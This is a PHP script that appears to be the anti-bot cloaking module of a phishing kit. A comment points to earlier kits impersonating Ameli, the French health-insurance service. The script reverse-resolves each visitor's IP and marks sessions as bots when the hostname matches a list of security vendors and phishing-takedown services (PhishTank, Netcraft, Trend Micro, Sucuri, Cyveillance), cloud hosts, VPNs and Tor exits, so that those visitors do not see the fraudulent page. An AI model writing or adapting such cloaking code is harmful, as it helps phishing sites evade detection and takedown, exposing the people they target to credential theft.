<?php

if (session_status() == PHP_SESSION_NONE) session_start();

// Skip if already whitelisted
if (isset($_SESSION['bot']) && $_SESSION['bot'] === false) return;

if (!function_exists('_ab3_get_ip')) {
    function _ab3_get_ip() {
        if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
            return trim($_SERVER['HTTP_CF_CONNECTING_IP']);
        }
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $parts = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            return trim($parts[0]);
        }
        return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    }
}

if (!function_exists('_ab3_get_hostname')) {
    function _ab3_get_hostname($ip) {
        $cacheFile = __DIR__ . '/dns_cache.json';
        $ttl = 86400; // 24 hours
        $cache = [];

        if (file_exists($cacheFile)) {
            $raw = @file_get_contents($cacheFile);
            if ($raw !== false) {
                $decoded = @json_decode($raw, true);
                if (is_array($decoded)) {
                    $cache = $decoded;
                }
            }
        }

        if (isset($cache[$ip]) && is_array($cache[$ip])) {
            if ((time() - $cache[$ip]['ts']) < $ttl) {
                return $cache[$ip]['host'];
            }
        }

        $host = @gethostbyaddr($ip);
        if ($host === false) {
            $host = $ip;
        }

        $cache[$ip] = ['host' => $host, 'ts' => time()];

        // Prune old entries to keep cache from growing unbounded
        foreach ($cache as $k => $v) {
            if (is_array($v) && (time() - $v['ts']) >= $ttl) {
                unset($cache[$k]);
            }
        }

        @file_put_contents($cacheFile, json_encode($cache), LOCK_EX);
        return $host;
    }
}

if (!function_exists('_ab3_is_blocked_hostname')) {
    function _ab3_is_blocked_hostname($hostname, $keywords) {
        $hostname = strtolower($hostname);
        foreach ($keywords as $keyword) {
            if (strpos($hostname, strtolower($keyword)) !== false) {
                return $keyword;
            }
        }
        return false;
    }
}

$_ab3_ip = _ab3_get_ip();
$_ab3_hostname = _ab3_get_hostname($_ab3_ip);

$_ab3_blockedKeywords = [
    'bot', 'crawler', 'spider', 'scanner', 'proxy', 'vpn', 'tor-exit',
    'amazonaws', 'aws', 'azure', 'google-cloud', 'digitalocean', 'linode',
    'vultr', 'ovh', 'hetzner', 'scaleway', 'ahrefs', 'semrush', 'mj12bot',
    'yandex', 'baiduspider', 'telegrambot', 'discordbot', 'slackbot',
    'exploit', 'hack', 'botnet', 'scraper', 'malware', 'seclookup',
    // From old Ameli files
    'above', 'softlayer', 'cyveillance', 'phishtank', 'dreamhost', 'netpilot',
    'calyxinstitute', 'msnbot', 'netcraft', 'trendmicro', 'sucuri', 'torservers',
    'messagelabs',
];

$_ab3_match = _ab3_is_blocked_hostname($_ab3_hostname, $_ab3_blockedKeywords);
if ($_ab3_match !== false) {
    $_SESSION['bot'] = true;
    $_SESSION['bot_reason'] = 'blocked_hostname:' . $_ab3_match;
    return;
}
